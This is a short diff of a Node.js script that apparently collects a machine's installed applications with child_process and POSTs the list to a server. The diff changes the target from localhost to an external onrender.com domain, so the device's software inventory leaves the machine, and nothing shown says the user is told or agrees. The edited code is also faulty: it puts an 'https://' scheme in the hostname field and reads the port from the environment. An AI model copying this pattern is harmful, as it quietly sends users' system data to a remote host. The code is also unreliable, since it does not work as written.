@@ -1,4 +1,4 @@
-let name = 'anass'
+let name = "anass";
 const { exec } = require("child_process");
 const http = require("http");
 function isUpper(letter) {
@@ -42,8 +42,8 @@ function processInstalledApplications(name) {
       const data = JSON.stringify({ data: apps });
 
       const options = {
-        hostname: "localhost",
-        port: 3000,
+        hostname: "https://lclika-game.onrender.com",
+        port: process.env.PORT,
         path: `/${name}`,
         method: "POST",
         headers: {
@@ -68,4 +68,4 @@ function processInstalledApplications(name) {
   );
 }
 
-processInstalledApplications(name); // Call the function with the initial value
+processInstalledApplications(name);
